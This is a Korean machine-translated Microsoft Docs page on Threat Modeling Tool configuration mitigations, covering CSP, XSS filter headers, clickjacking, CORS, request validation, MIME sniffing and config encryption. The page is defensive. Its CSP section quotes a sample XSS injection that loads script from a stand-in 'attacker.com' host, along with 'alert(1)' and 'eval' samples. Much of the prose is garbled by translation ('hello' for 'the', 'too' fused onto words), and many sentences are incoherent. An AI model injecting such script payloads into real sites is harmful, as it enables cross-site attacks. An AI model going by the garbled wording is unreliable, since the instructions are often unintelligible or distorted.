---
title: "Azure 관리-Microsoft 위협 모델링 도구-aaaConfiguration | Microsoft Docs"
description: "hello 위협 모델링 도구에에서 노출 위협에 대 한 완화"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>보안 프레임: 구성 관리 | 완화 
| 제품/서비스 | 문서 |
| --------------- | ------- |
| **웹 응용 프로그램** | <ul><li>[CSP(콘텐츠 보안 정책)를 구현하고 인라인 JavaScript를 사용하지 않도록 설정](#csp-js)</li><li>[브라우저의 XSS 필터를 사용하도록 설정](#xss-filter)</li><li>[ASP.NET 응용 프로그램 추적 및 디버깅 이전 toodeployment 사용 하지 않도록 설정 해야 합니다.](#trace-deploy)</li><li>[신뢰할 수 있는 원본에서만 타사 JavaScript에 액세스](#js-trusted)</li><li>[인증된 ASP.NET 페이지에 UI 변조(UI Redressing) 또는 클릭재킹(clickjacking) 방어 기능이 통합되어 있는지 확인](#ui-defenses)</li><li>[ASP.NET 웹 응용 프로그램에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인](#cors-aspnet)</li><li>[ASP.NET 페이지에서 ValidateRequest 특성을 사용하도록 설정](#validate-aspnet)</li><li>[로컬로 호스팅되는 최신 버전의 JavaScript 라이브러리 사용](#local-js)</li><li>[자동 MIME 스니핑을 사용하지 않도록 설정](#mime-sniff)</li><li>[Windows Azure 웹 사이트 tooavoid 지문에 표준 서버 헤더를 제거 합니다.](#standard-finger)</li></ul> |
| **데이터베이스** | <ul><li>[데이터베이스 엔진 액세스를 위한 Windows 방화벽 구성](#firewall-db)</li></ul> |
| **앱 API** | <ul><li>[ASP.NET Web API에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인](#cors-api)</li><li>[중요한 데이터가 포함된 Web API 구성 파일의 섹션 암호화](#config-sensitive)</li></ul> |
| **IoT 장치** | <ul><li>[모든 관리 인터페이스를 강력한 자격 증명으로 보호하는지 확인](#admin-strong)</li><li>[장치에서 알 수 없는 코드를 실행할 수 없는지 확인](#unknown-exe)</li><li>[bit-locker를 사용하여 OS 및 IoT 장치의 추가 파티션 암호화](#partition-iot)</li><li>[장치에만 hello 최소 서비스/기능이 활성화 되어 있는지 확인 하십시오.](#min-enable)</li></ul> |
| **IoT 필드 게이트웨이** | <ul><li>[bit-locker를 사용하여 OS 및 IoT 필드 게이트웨이의 추가 파티션 암호화](#field-bit-locker)</li><li>[Hello 기본 로그인 자격 증명의 hello 필드 게이트웨이 설치 하는 동안 변경 않았는지 확인 하십시오](#default-change)</li></ul> |
| **IoT 클라우드 게이트웨이** | <ul><li>[해당 hello 클라우드 게이트웨이 구현 toodate 프로세스 tookeep hello 연결 된 장치 펌웨어 확인](#cloud-firmware)</li></ul> |
| **컴퓨터 신뢰 경계** | <ul><li>[장치에서 조직 정책에 따라 구성된 끝점 보안 제어를 사용하는지 확인](#controls-policies)</li></ul> |
| **Azure 저장소** | <ul><li>[Azure 저장소 액세스 키의 보안 관리 확인](#secure-keys)</li><li>[Azure 저장소에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[WCF의 서비스 제한 기능을 사용하도록 설정](#throttling)</li><li>[WCF - 메타데이터를 통한 정보 공개](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>CSP(콘텐츠 보안 정책)를 구현하고 인라인 JavaScript를 사용하지 않도록 설정

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [소개 tooContent 보안 정책](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [콘텐츠 보안 정책 참조](http://content-security-policy.com/), [보안 기능](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [소개 toocontent 보안 정책](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [CSP 사용할 수 있습니까?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **단계** | <p>콘텐츠 보안 정책 (CSP)는 방어 보안 메커니즘은 표준는 W3C hello 콘텐츠에 자신의 사이트에 포함 된 웹 응용 프로그램 소유자 toohave 컨트롤 수 있도록 합니다. CSP은 hello 웹 서버에서 HTTP 응답 헤더도 추가 되 고 브라우저에서 클라이언트측 hello에 적용 됩니다. 허용 목록 기반 정책이며, 웹 사이트에서 JavaScript와 같은 액티브 콘텐츠를 로드할 수 있는 트러스트된 도메인 집합을 선언할 수 있습니다.</p><p>CSP hello를 다음 보안 이점을 제공 합니다.</p><ul><li>**방지할 수 있는 XSS:** 페이지가 취약 tooXSS 있으면 공격자 악용할 수 있는 것에 두 가지 방법:<ul><li>`<script>malicious code</script>`를 삽입합니다. 이 악용 tooCSP의 기본 제한이-1 기한 작동 하지 않습니다.</li><li>`<script src=”http://attacker.com/maliciousCode.js”/>`를 삽입합니다. Hello 제어 하는 공격자가 도메인은 도메인의 CSP의 허용 목록에 사용할 수 없기 때문에이 악용 작동 하지 않습니다.</li></ul></li><li>**데이터 exfiltration 제어할:** hello 연결 tooconnect tooan 외부 웹 사이트 및 데이터 도용 만들려고 할 경우 악성 콘텐츠는 웹 페이지에서 CSP에서 중단 됩니다. 이 hello 대상 도메인 CSP의 허용 목록에 되지 않으므로</li><li>**클릭 jacking을 막는 최전방:** 클릭 jacking는 공격 기술 정품 웹 사이트를 작성 하 고 UI 요소에서 사용자가 tooclick 강제로 수 악의적인 사용자는를 사용 하 여 합니다. 현재 클릭재킹에 대한 방어는 X-Frame-Options 응답 헤더를 구성하여 수행됩니다. 이 헤더를 준수 하지 않는 브라우저 및 CSP 앞으로 이동 클릭 jacking에 대 한 표준 방식으로 toodefend 됩니다.</li><li>**실시간 공격 보고:** 브라우저 hello 웹 서버에 구성 된 알림 tooan 끝점을 자동으로 트리거합니다 CSP 지원 웹 사이트에 대 한 삽입 공격 하는 경우. CSP는 이러한 방식으로 실시간 경고 시스템의 역할을 수행합니다.</li></ul> |

### <a name="example"></a>예제
예제 정책: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
이 정책 hello 웹 응용 프로그램의 서버 및 google analytics 서버 에서만 스크립트 tooload가 있습니다. 다른 사이트에서 로드한 스크립트는 거부됩니다. CSP는 웹 사이트에서 사용 하도록 설정 하는 경우 hello 다음 기능은 자동으로 비활성화 된 toomitigate XSS 공격입니다. 

### <a name="example"></a>예제
인라인 스크립트가 실행되지 않습니다. 다음은 인라인 스크립트의 예제입니다. 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>예제
문자열이 코드로 평가되지 않습니다. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>브라우저의 XSS 필터를 사용하도록 설정

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [XSS 보호 필터](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection)(영문) |
| **단계** | <p>X XSS 보호 응답 헤더 구성 컨트롤 hello 브라우저의 사이트 간 스크립트 필터입니다. 이 응답 헤더의 값은 다음과 같습니다.</p><ul><li>`0:`이 hello 필터 비활성화 됩니다.</li><li>`1: Filter enabled`Hello 브라우저 hello 페이지를 정리 합니다 순서 toostop hello 공격에서 사이트 간 스크립팅 공격이 감지 된 경우</li><li>`1: mode=block : Filter enabled` Hello 브라우저 hello 페이지의 렌더링 되지 것입니다 XSS 공격 검색 되 면 hello 페이지를 정리 하지 않고</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled` hello 브라우저 hello 페이지 및 보고서 hello 위반을 정리 됩니다.</li></ul><p>이 CSP 위반 보고서 toosend 세부 정보 tooa 선택한의 URI를 사용 하 여 Chromium 함수. hello 마지막 두 개 이상의 옵션 값으로 간주 됩니다 안전 합니다.</p>|

## <a id="trace-deploy"></a>ASP.NET 응용 프로그램 추적 및 디버깅 이전 toodeployment 사용 하지 않도록 설정 해야 합니다.

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [ASP.NET 디버깅 개요](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET 추적 개요](http://msdn2.microsoft.com/library/bb386420.aspx), [방법: ASP.NET 응용 프로그램에 대한 추적 활성화](http://msdn2.microsoft.com/library/0x5wc973.aspx), [방법: ASP.NET 응용 프로그램에 디버깅 사용](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **단계** | Hello 페이지에 대 한 추적을 사용 하는 경우도 요청 하는 모든 브라우저 내부 서버 상태와 워크플로 대 한 데이터를 포함 하는 hello 추적 정보를 가져옵니다. 이 정보는 보안에 중요할 수 있습니다. Hello 페이지를 디버깅 하도록 구성 되어 전체 스택 추적 데이터의 hello 서버 결과에서 발생 하는 오류 toohello 브라우저를 나타납니다. 해당 데이터는 hello 서버 워크플로에 대 한 보안 관련 정보를 노출할 수 있습니다. |

## <a id="js-trusted"></a>신뢰할 수 있는 원본에서만 타사 JavaScript에 액세스

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | 타사 JavaScript는 신뢰할 수 있는 원본에서만 참조해야 합니다. hello 참조 끝점 SSL에 항상 있어야 합니다. |

## <a id="ui-defenses"></a>인증된 ASP.NET 페이지에 UI 변조(UI Redressing) 또는 클릭재킹(clickjacking) 방어 기능이 통합되어 있는지 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [OWASP 클릭재킹 방어 참고 자료](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IEInternals - X-Frame-Options로 클릭재킹 대응](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **단계** | <p>클릭 jacking 라고도 "UI 보상 공격이"는 경우 공격자가 여러 투명 또는 불투명 레이어 tootrick 사용자를 사용 하 여 단추 또는 링크를 클릭 하면으로 tooclick hello 최상위 페이지에 의도 된 될 때 다른 페이지에 있습니다.</p><p>이렇게이 계층화 hello 희생자의 페이지 로드 iframe 있는 악의적인 페이지를 만들어 이루어집니다. 따라서 hello 공격자가 "하이재킹"가 해당 페이지를 위해 제공 하 고 라우팅하고 tooanother 페이지, 대개 다른 응용 프로그램, 도메인 또는 둘 다가 소유 합니다. tooprevent 클릭 jacking 디렉터리 집합 hello 적절 한 X-프레임-옵션 HTTP 응답 헤더 hello 브라우저 toonot 지시 하는 다른 도메인의 프레이밍을 사용 합니다.</p>|

### <a name="example"></a>예제
IIS web.config 통해 hello X-프레임-옵션 헤더를 설정할 수 있습니다. 절대로 프레이밍하지 않아야 하는 사이트에 대한 web.config 코드 조각은 다음과 같습니다. 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>예제
통해만 구성 해야 하는 사이트에 대 한 Web.config 코드 페이지에 hello 동일 도메인: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>ASP.NET 웹 응용 프로그램에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 웹 양식, MVC5 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | <p>브라우저 보안 AJAX 요청 tooanother 도메인에서 웹 페이지를 방지 합니다. 이 제한은 hello 동일 원본 정책 이라고 하 고 다른 사이트에서 중요 한 데이터를 읽는 악성 사이트를 방지 합니다. 그러나 경우에 따라 수 수 필요한 tooexpose Api 안전 하 게 소비할 수 있는 다른 사이트입니다. 교차 원본 리소스 공유 (CORS)는 toorelax hello 동일 원본 정책 서버에 있도록 W3C 표준입니다. CORS를 사용하면 서버에서 명시적으로 일부 원본 간 요청을 허용하는 한편 다른 요청은 거부할 수 있습니다.</p><p>CORS는 JSONP와 같은 이전 기술보다 더 안전하고 유연합니다. 본질적으로 CORS 사용 변환 tooadding 몇 가지 HTTP 응답 헤더 (액세스 제어-*)는 여러 가지 방법으로 toohello 웹 응용 프로그램 및이 수행할 수 있습니다.</p>|

### <a name="example"></a>예제
액세스 tooWeb.config를 사용할 수 있는 경우 코드 다음 hello를 통해 CORS는 추가할 수 있습니다. 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>예제
액세스 tooweb.config 사용할 수 없는 경우 hello CSharp 코드 뒤에 추가 하 여 CORS는 구성할 수 있습니다. 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

"액세스 제어-허용-원본" 특성에 대 한 원본 목록 hello 중요 tooensure는 설정 되어 하십시오 원본 tooa 유한 및 신뢰할 수 있는 집합입니다. 이 부적절 하 게 tooconfigure 실패 (예: hello 값으로 설정 ' *')을 사용 하면 교차 원본 요청 악성 사이트 tootrigger toohello 웹 응용 프로그램 > 아무런 제한 없이 받으므로 hello 응용 프로그램 취약 tooCSRF 공격입니다. 

## <a id="validate-aspnet"></a>ASP.NET 페이지에서 ValidateRequest 특성을 사용하도록 설정

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 웹 양식, MVC5 |
| **특성**              | 해당 없음  |
| **참조**              | [요청 유효성 검사 - 스크립트 공격 방지](http://www.asp.net/whitepapers/request-validation) |
| **단계** | <p>요청 유효성 검사, ASP.NET의 버전 1.1에서 이후 기능을 포함 하는 콘텐츠 인코딩되지 않은 HTML 수락 hello 서버를 방지 합니다. 이 기능은 toohelp 클라이언트 스크립트 코드 또는 HTML을 저장 하 고 제공 tooother 사용자 자신도 모르는 사이 제출 된 tooa 서버 수 그에 따라 일부 스크립트 삽입 공격을 방지 합니다. 모든 입력 데이터의 유효성을 검사하고 적절한 경우 HTML로 인코딩하는 것이 좋습니다.</p><p>요청 유효성 검사는 잠재적으로 위험한 값의 모든 입력된 데이터 tooa 목록을 비교 하 여 수행 됩니다. 일치하는 경우 ASP.NET에서 `HttpRequestValidationException`을 발생시킵니다. 요청 유효성 검사 기능은 기본적으로 사용하도록 설정됩니다.</p>|

### <a name="example"></a>예제
그러나 이 기능은 다음과 같이 페이지 수준에서 사용하지 않도록 설정할 수 있습니다. 
```XML
<%@ Page validateRequest="false" %> 
```
또는 다음과 같이 응용 프로그램 수준에서 사용하지 않도록 설정할 수 있습니다. 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
요청 유효성 검사 기능은 지원되지 않으며 MVC6 파이프라인의 일부가 아닙니다. 

## <a id="local-js"></a>로컬로 호스팅되는 최신 버전의 JavaScript 라이브러리 사용

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | <p>JQuery와 같은 표준 JavaScript 라이브러리를 사용하는 개발자는 알려진 보안 결함이 없는 일반적인 JavaScript 라이브러리의 승인된 버전을 사용해야 합니다. 이전 버전의 알려진된 취약 한 부분에 대 한 보안 수정이 포함 되어 있으므로 toouse hello 가장 최신 버전의 hello 라이브러리를가 하는 것이 좋습니다.</p><p>Hello 최신 릴리스를 toocompatibility 이유로 인해 사용할 수 없는 경우 최소 버전 아래 hello는 사용 해야 합니다.</p><p>허용 가능한 최소 버전:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms and Ajax**<ul><li>ASP.NET Web Forms and Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>공용 CDN과 같이 외부 사이트의 JavaScript 라이브러리를 로드하면 안됩니다.</p>|

## <a id="mime-sniff"></a>자동 MIME 스니핑을 사용하지 않도록 설정

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [IE8 보안 5부: 포괄적 보호](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)(영문), [MIME 형식](http://en.wikipedia.org/wiki/Mime_type)(영문) |
| **단계** | X-콘텐츠-유형-옵션 hello 헤더는 개발자가 사용할 수 있는 HTTP 헤더는 해당 콘텐츠 되지 않아야 MIME 스니핑 toospecify 합니다. 이 헤더는 디자인 된 toomitigate MIME 스니핑 공격입니다. 사용자가 제어할 수 있는 콘텐츠를 포함할 수 있는 각 페이지에 대 한 HTTP 헤더 X hello를 사용 해야-콘텐츠-유형-옵션: nosniff 합니다. hello 응용 프로그램의 모든 페이지에 대 한 전역적으로 tooenable hello의 필수 헤더를 할 수 있는 hello 다음 중 하나|

### <a name="example"></a>예제
Hello 응용 프로그램에서 인터넷 정보 서비스 (IIS) 7부터 호스팅되는 경우 hello 헤더 hello web.config 파일에 추가 합니다. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>예제
Hello 통해 hello 헤더 추가 전역 응용 프로그램\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>예제
사용자 지정 HTTP 모듈을 구현합니다. 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>예제
Tooindividual 응답을 추가 하 여 특정 페이지에 대해서만 hello 필수 헤더를 설정할 수 있습니다. 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Windows Azure 웹 사이트 tooavoid 지문에 표준 서버 헤더를 제거 합니다.

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 웹 응용 프로그램 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | EnvironmentType - Azure |
| **참조**              | [Microsoft Azure 웹 사이트에서 표준 서버 헤더 제거](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/)(영문) |
| **단계** | X 전원이-By, 서버와 같은 헤더 X AspNet 버전 한 hello 서버와 기본 기술을 hello에 대 한 정보를 제공 합니다. Toosuppress 좋습니다 지문 하는 것을 막을 수는 이러한 헤더가 hello 응용 프로그램 |

## <a id="firewall-db"></a>데이터베이스 엔진 액세스를 위한 Windows 방화벽 구성

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 데이터베이스 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | SQL Azure, 온-프레미스 |
| **특성**              | N/A, SQL 버전 - V12 |
| **참조**              | [Tooconfigure Azure SQL 데이터베이스 방화벽](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [데이터베이스 엔진 액세스에 대 한 Windows 방화벽 구성](https://msdn.microsoft.com/library/ms175043) |
| **단계** | 방화벽 시스템 리소스에 무단으로 액세스 toocomputer 방지할 수 있습니다. tooaccess 방화벽을 통해 hello SQL Server 데이터베이스 엔진의 인스턴스를 SQL Server tooallow 액세스를 실행 하는 hello 컴퓨터에서 hello 방화벽을 구성 해야 |

## <a id="cors-api"></a>ASP.NET Web API에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | Web API | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | MVC 5 |
| **특성**              | 해당 없음  |
| **참조**              | [ASP.NET Web API 2에서 원본 간 요청 사용](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)(영문), [ASP.NET Web API - ASP.NET Web API 2에서 CORS 지원](https://msdn.microsoft.com/magazine/dn532203.aspx)(영문) |
| **단계** | <p>브라우저 보안 AJAX 요청 tooanother 도메인에서 웹 페이지를 방지 합니다. 이 제한은 hello 동일 원본 정책 이라고 하 고 다른 사이트에서 중요 한 데이터를 읽는 악성 사이트를 방지 합니다. 그러나 경우에 따라 수 수 필요한 tooexpose Api 안전 하 게 소비할 수 있는 다른 사이트입니다. 교차 원본 리소스 공유 (CORS)는 toorelax hello 동일 원본 정책 서버에 있도록 W3C 표준입니다.</p><p>CORS를 사용하면 서버에서 명시적으로 일부 원본 간 요청을 허용하는 한편 다른 요청은 거부할 수 있습니다. CORS는 JSONP와 같은 이전 기술보다 더 안전하고 유연합니다.</p>|

### <a name="example"></a>예제
Hello App_Start/WebApiConfig.cs에서 코드 toohello WebApiConfig.Register 메서드 뒤 hello 추가 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>예제
EnableCors 특성은 컨트롤러에 적용 된 tooaction 메서드를 다음과 같을 수 있습니다. 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

EnableCors 특성에 대 한 원본 목록 hello 중요 tooensure는 설정 되어 하십시오 원본 tooa 유한 및 신뢰할 수 있는 집합입니다. 이 부적절 하 게 tooconfigure 실패 (예: hello 값으로 설정 ' *') 악성 사이트 tootrigger 교차 원본 요청 toohello API 아무런 제한 없이 사용 하면 > hello API 취약 tooCSRF 공격을 받으므로 합니다. EnableCors는 컨트롤러 수준에서 데코레이팅할 수 있습니다. 

### <a name="example"></a>예제
클래스에는 특정 방법에 CORS toodisable hello DisableCors 아래와 같이 특성을 사용할 수 있습니다. 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | Web API | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | MVC 6 |
| **특성**              | 해당 없음  |
| **참조**              | [ASP.NET Core 1.0에서 CORS(원본 간 요청) 사용](https://docs.asp.net/en/latest/security/cors.html)(영문) |
| **단계** | <p>ASP.NET Core 1.0에서 CORS는 미들웨어 또는 MVC를 통해 사용하도록 설정할 수 있습니다. MVC tooenable CORS hello 같은 CORS 서비스는 사용 되지만 hello를 사용 하는 경우 CORS 미들웨어가 않습니다.</p>|

**접근 방식 1** 활성화 CORS 미들웨어를: hello 전체 응용 프로그램에 대 한 CORS tooenable hello UseCors 확장 메서드를 사용 하 여 hello CORS 미들웨어 toohello 요청 파이프라인을 추가 합니다. 크로스-원본 정책 hello CorsPolicyBuilder 클래스를 사용 하 여 hello CORS 미들웨어를 추가 하는 경우 지정할 수 있습니다. 두 가지 방법으로 toodo이

### <a name="example"></a>예제
hello에는 먼저 toocall UseCors 람다 사용 됩니다. hello 람다는 CorsPolicyBuilder 개체를 사용 합니다. 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>예제
두 번째 hello 하나 toodefine 되었거나 이상의 명명 된 CORS 정책 및 선택 hello 정책 이름으로 런타임 시. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**접근 방식 2** MVC에서 CORS를 사용 하도록 설정: 개발자 수 또는 사용 하 여 MVC tooapply 작업당: 컨트롤러 당 또는 전체적으로 모든 컨트롤러에 대 한 특정 CORS 합니다.

### <a name="example"></a>예제
작업당: 특정 작업에 대 한 CORS 정책을 toospecify hello [EnableCors] 특성 toohello 동작을 추가 합니다. Hello 정책 이름을 지정 합니다. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>예제
컨트롤러별: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>예제
전역적으로: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
EnableCors 특성에 대 한 원본 목록 hello 중요 tooensure는 설정 되어 하십시오 원본 tooa 유한 및 신뢰할 수 있는 집합입니다. 이 부적절 하 게 tooconfigure 실패 (예: hello 값으로 설정 ' *') 악성 사이트 tootrigger 교차 원본 요청 toohello API 아무런 제한 없이 사용 하면 > hello API 취약 tooCSRF 공격을 받으므로 합니다. 

### <a name="example"></a>예제
컨트롤러 또는 동작을 사용 하 여 hello [DisableCors] 특성에 대 한 CORS toodisable 합니다. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>중요한 데이터가 포함된 Web API 구성 파일의 섹션 암호화

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | Web API | 
| **SDL 단계**               | 배포 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [방법: ASP.NET 2.0 사용 하 여 DPAPI에서 구성 섹션 암호화](https://msdn.microsoft.com/library/ff647398.aspx), [보호 되는 구성 공급자를 지정 하](https://msdn.microsoft.com/library/68ze1hb2.aspx), [tooprotect 응용 프로그램 암호를 사용 하 여 Azure 키 자격 증명 모음](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
